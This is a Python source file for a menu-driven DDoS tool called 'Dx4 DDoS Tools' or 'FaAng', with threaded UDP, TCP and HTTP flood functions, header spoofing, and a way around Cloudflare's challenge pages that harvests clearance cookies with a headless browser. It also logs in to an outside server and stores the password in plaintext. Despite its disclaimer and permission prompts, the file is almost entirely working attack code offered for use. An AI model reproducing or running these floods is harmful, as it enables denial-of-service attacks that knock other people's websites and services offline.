#!/data/data/com.termux/files/usr/bin/python
#!/usr/bin/python

import datetime, os, sys, threading, getpass
from loading import LoadingThread
import time, requests, socket, socks, random, httpx
from colorama import Back, Fore, Style
from urllib.parse import urlparse
import undetected_chromedriver as webdriver
import subprocess, cloudscraper, argparse
from requests.cookies import RequestsCookieJar
logo = f"""
{Fore.MAGENTA} █████▒▄▄▄          ▄▄▄       ███▄    █   ▄████ 
▓██   ▒▒████▄       ▒████▄     ██ ▀█   █  ██▒ ▀█▒
▒████ ░▒██  ▀█▄     ▒██  ▀█▄  ▓██  ▀█ ██▒▒██░▄▄▄░
{Fore.RESET}░▓█▒  ░░██▄▄▄▄██    ░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█  ██▓
░▒█░    ▓█   ▓██▒    ▓█   ▓██▒▒██░   ▓██░░▒▓███▀▒
 ▒ ░    ▒▒   ▓▒█░    ▒▒   ▓▒█░░ ▒░   ▒ ▒  ░▒   ▒ 
 ░       ▒   ▒▒ ░     ▒   ▒▒ ░░ ░░   ░ ▒░  ░   ░ 
 ░ ░     ░   ▒        ░   ▒      ░   ░ ░ ░ ░   ░ 
             ░  ░         ░  ░         ░       ░ 
                                                 
THE OWNER OF THESE TOOLS (Dx4) WILL NOT BE RESPONSIBLE 
FOR ANY DAMAGE CAUSED BY THE USER OWN THEREFORE,
USE THESE TOOLS ONLY TO TEST YOUR OWN SITE FOR {Fore.GREEN}VULNERABILITIES 
{Fore.RESET}ATTACKING SITES OWNED BY OTHERS, {Fore.YELLOW}FAANG SHOULD 
NOT BE USED FOR ILLEGAL ACTIVITIES{Fore.RESET}, BY USING THIS SOFTWARE, 
{Fore.RED}YOU MUST AGREE TO BE FULLY RESPONSIBLE FOR DAMAGE 
CAUSED BY FAANG IN ANY WAY TO YOUR OWN{Fore.RESET}. THE CREATORS 
DO NOT WANT PEOPLE TO USE FAANG IF THEY HAVE NO 
EXPERIENCE WITH ATTACKS INCLUDING. ANY ATTACK WILL CAUSE 
TEMPORARY DAMAGE, BUT {Fore.YELLOW}LONG TERM DAMAGE{Fore.RESET} IS POSSIBLE. 
FAANG SHOULD NOT ADVISE PEOPLE TO DO {Fore.RED}ILLEGAL ACTIVITIES{Fore.RESET}.
"""
ipAddress = None
message_log = f"{Fore.MAGENTA} [*] {Fore.RESET}Entering..."
loadingg = LoadingThread(message_log, 'default')
########
########
LOGIN_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), '.log') 

def check_login_file():
    try:
        with open(LOGIN_FILE, "r") as f:
            login_data = f.readlines()
            if len(login_data) == 2:
                username = login_data[0].strip()
                password = login_data[1].strip()
                return username, password
    except FileNotFoundError:
        pass
    return None, None

def write_login_file(username, password):
    with open(LOGIN_FILE, "w") as f:
        f.write(username + "\n")
        f.write(password + "\n")
def login():
    global loadingg
    url = "https://monitor.awangsite.repl.co/api/login.php"
    saved_username, saved_password = check_login_file()
    sucLog = ""
    if saved_username and saved_password:
        username = saved_username
        password = saved_password
    else:
        StartTitle("Login Script")
        username = input(f"{Fore.MAGENTA} [*] {Fore.RESET}Username: ")
        password = getpass.getpass(f"{Fore.MAGENTA} [*] {Fore.RESET}Password: ")
        sucLog = "1"
    payload = {
        "username": username,
        "password": password
    }
    if not loadingg.is_run():
        loadingg = LoadingThread(message_log, 'default')
        loadingg.start()
    response = requests.post(url, data=payload, stream=True, timeout=15)
    if response.status_code == 200:
        data = response.json()
        if data["status"] == "success":
            loadingg.stop()
            loadingg.join()
            if sucLog:
                print(f"{Fore.GREEN} [*] {Fore.RESET}Login success!")  
                time.sleep(1)
            write_login_file(username, password)
            start() 
            
        elif data["status"] == "error":
            loadingg.stop()
            loadingg.join()
            print(f"{Fore.RED} [*] {Fore.RESET}Login failed. ", data["message"])
            time.sleep(1) 
            login() 
        else:
            loadingg.stop()
            loadingg.join()
            print(f"{Fore.RED} [*] {Fore.RESET}Invalid response")
            time.sleep(1) 
            login() 
            
    else:
        loadingg.stop()
        loadingg.join()
        print(f"{Fore.RED} [*] {Fore.RESET}Request failed")
        login() 
        
#get
def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target

def get_proxylist(type):
    if type == "SOCKS5":
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=socks5").text
        open("./resources/socks5.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r
    elif type == "HTTP":
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=http").text
        open("./resources/http.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r

def get_proxies():
    global proxies
    if not os.path.exists("./proxy.txt"):
        stdout.write(Fore.MAGENTA+" [*]"+Fore.WHITE+" You Need Proxy File ( ./proxy.txt )\n")
        return False
    proxies = open("./proxy.txt", 'r').read().split('\n')
    return True

def get_cookie(url):
    global useragent, cookieJAR, cookie
    options = webdriver.ChromeOptions()
    arguments = [
    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
    ]
    for argument in arguments:
        options.add_argument(argument)
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    for _ in range(60):
        cookies = driver.get_cookies()
        tryy = 0
        for i in cookies:
            if i['name'] == 'cf_clearance':
                cookieJAR = driver.get_cookies()[tryy]
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                return True
            else:
                tryy += 1
                pass
        time.sleep(1)
    driver.quit()
    return False

def spoof(target):
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    spoofip = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return (
        "X-Forwarded-Proto: Http\r\n"
        f"X-Forwarded-Host: {target['host']}, 1.1.1.1\r\n"
        f"Via: {spoofip}\r\n"
        f"Client-IP: {spoofip}\r\n"
        f'X-Forwarded-For: {spoofip}\r\n'
        f'Real-IP: {spoofip}\r\n'
    )
##end

def Countdown(start_time, duration_seconds):
    start_time = float(start_time)
    while (time.time() - start_time) < duration_seconds:
        remaining_time = duration_seconds - (time.time() - start_time)
        time_formatted = "{:.1f}".format(remaining_time)
        sys.stdout.write("\r"+ Fore.MAGENTA+" [*] "+Fore.RESET+ "Attack Timer => {} second    ".format(time_formatted))
        sys.stdout.flush()
        time.sleep(0.1)
    print(f"\r{Fore.GREEN} [*] {Fore.RESET}Attack Done                   \n")

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        if response.status_code == 200:
            data = response.json()
            return data['ip']
    except requests.exceptions.RequestException as e:
        return

def get_provider(ip):
    try:
        response = requests.get(f'https://ipapi.co/{ip}/json/')
        if response.status_code == 200:
            data = response.json()
            return data['org']
    except requests.exceptions.RequestException as e:
        print("Error:", e)

# METHOD

def LaunchGET(url, th, t):
    duration_seconds = int(t)
    until = datetime.datetime.now() + datetime.timedelta(seconds=duration_seconds)
    thread_count = int(th)
    for _ in range(thread_count):
        try:
            thd = threading.Thread(target=AttackGET, args=(url, until))
            thd.start()
        except:
            pass

def AttackGET(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(url, timeout=15)
            requests.get(url, timeout=15)
        except:
            pass

def LaunchPOST(url, th, t):
    duration_seconds = int(t)
    until = datetime.datetime.now() + datetime.timedelta(seconds=duration_seconds)
    thread_count = int(th)
    for _ in range(thread_count):
        try:
            thd = threading.Thread(target=AttackPOST, args=(url, until))
            thd.start()
        except:
            pass

def AttackPOST(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.post(url, timeout=15)
            requests.post(url, timeout=15)
        except:
            pass
            
            
def LaunchSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSOC, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackSOC(target, until_datetime, req):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.connect((str(target['host']), int(target['port'])))

    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

def LaunchHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until)).start()

def AttackHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    client = httpx.Client(http2=True)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def LaunchSPOOF(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSPOOF, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackSPOOF(target, until_datetime, req): #
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass
            
def LaunchHEAD(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackHEAD, args=(url, until))
            thd.start()
        except:
            pass

def AttackHEAD(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.head(url)
            requests.head(url)
        except:
            pass
            
def attackSTELLAR(url, threads, timer):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()

def LaunchSTELLAR(url, timer):
    timelol = time.time() + int(timer)
    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()
def LaunchCFPRO(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFPRO(url, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False)
            scraper.get(url=url, headers=headers, allow_redirects=False)
        except:
            pass
            
def LaunchCFSOC(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFSOC,args=(until, target, req,))
            thd.start()
        except:  
            pass

def AttackCFSOC(until_datetime, target, req):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass

def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass
            
#Layer4
def runflooder(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = random._urandom(4096)
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=flooder, args=(host, port, rand, until))
            thd.start()
        except:
            pass

def flooder(host, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(rand, (host, int(port)))
        except:
            sock.close()
            pass


def runsender(host, port, th, t, payload):
    if payload == "":
        payload = random._urandom(60000)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    #payload = Payloads[method]
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=sender, args=(host, port, until, payload))
            thd.start()
        except:
            pass

def sender(host, port, until_datetime, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(payload, (host, int(port)))
        except:
            sock.close()
            pass

# View
def DdosGET():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")

    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        LaunchGET(target, thread, t)
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()

def DdosPOST():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")

    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        LaunchPOST(target, thread, t)
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()

def DdosSOC():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        LaunchSOC(target, thread, t)
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()
def DdosHTTP2():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        LaunchHTTP2(target, thread, t)
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()
        
def DdosSPOOF():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        LaunchSPOOF(target, thread, t)
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()

def DdosHEAD():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        LaunchHEAD(target, thread, t)
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()

def DdosSKY():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        threading.Thread(target=attackSTELLAR, args=(target, thread, t)).start()
        timer.start()
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()
        
def DdosCFREQ():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        if get_cookie(target):
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchCFPRO(target, thread, t)
            timer.join()
        else:
            print(f"{Fore.RED} [*] {Fore.RESET}Cookie reset")
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()
def DdosCFSOC():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        if get_cookie(target):
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchCFSOC(target, thread, t)
            timer.join()
        else:
            print(f"{Fore.RED} [*] {Fore.RESET}Cookie reset.")
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()
def DdosCFB():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()

def DdosUDP():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input IP Address : ")
    port = input(Fore.MAGENTA+" [*] "+Fore.RESET+"PORT : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        threading.Thread(target=runsender, args=(target, port, t, thread,"")).start()
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()

def DdosTCP():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input IP Address : ")
    port = input(Fore.MAGENTA+" [*] "+Fore.RESET+"PORT : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()

             
def CheckInternet():
    global ipAddress
    global provider
    global tir
    global loadingg
    if not loadingg.is_run():
        loadingg = LoadingThread(message_log, 'default')
        loadingg.start()
    ipAddress = get_public_ip()
    loadingg.stop()
    loadingg.join()
    if ipAddress:
        print(Fore.GREEN + " [x] " + Fore.RESET + "Internet access")
    else:
        ipAddress = Fore.RED + "No Internet" + Fore.RESET
        print(Fore.RED + " [x] " + Fore.RESET + "No access internet")
    time.sleep(2)

def StartTitle(nametools):
    global ipAddress
    if not check_text(ipAddress):
        CheckInternet()
    
    os.system("clear")
    print(logo)
    print(Fore.MAGENTA + " [~] " + Fore.RESET + nametools)
    print(Fore.MAGENTA + " [!] " + Fore.RESET + "Public IP : " + ipAddress)

def check_text(text):
    if text is None or text.strip() == "":
        return 0
    else:
        return 1
def DisplayMenu(menu_items):
    print(("-"*22)+f"{Fore.MAGENTA}[{Fore.RESET}Menu{Fore.MAGENTA}]{Fore.RESET}"+("-"*22))
    print("|") 
    indexX = 0
    for index, item in enumerate(menu_items, start=1):
        if not item:
            print("|")
            #print("|   ["+("-"*19)+f"{Back.MAGENTA+Fore.BLACK} ⊙{Fore.RESET}﹏{Fore.BLACK}⊙ {Fore.RESET+Back.RESET}"+("-"*19)+"]")
            #print("|")
        if item:
            indexX += 1
            print(f"|-->{Fore.BLUE}[{indexX}]{Fore.RESET} {item}")
    print("|")
    print("-" * 50)
    print("|")
    print(f"|-->{Fore.BLUE}[0]{Fore.RESET} Exit")
    print(f"|-->{Fore.BLUE}[00]{Fore.RESET} About Script")
    print(f"|-->{Fore.BLUE}[000]{Fore.RESET} LogOut From FaAng account")
    print("|") 
    print("-" * 50)
#end

def start():
    StartTitle("Dx4 DDoS Tools")
    print() 
    menu = [
        "UDP       layer4 => UDP Attack", 
        "TCP       layer4 => TCP Attack", 
        "", 
        "GET       layer7 => 'Requests GET' Attack", 
        "POS       layer7 => 'Requests POST' Attack", 
        "SOC       layer7 => Socket Attack" , 
        "HTTP2     layer7 => HTTP 2.0 Request Attack", 
        "SPOOF     layer7 => HTTP Spoof Socket Attack  ", 
        "HEAD      layer7 => Head Request Attack", 
        "SKY       layer7 => Sky method", 
        "CFREQ    layer7 => Bypass CF UAM, CAPTCHA, BFM (request)", 
        "CFSOC    layer7 => Bypass CF UAM, CAPTCHA, BFM (socket)", 
        "CFB      layer7 => Bypass CF Attack"
    ]
    DisplayMenu(menu)
    print() 
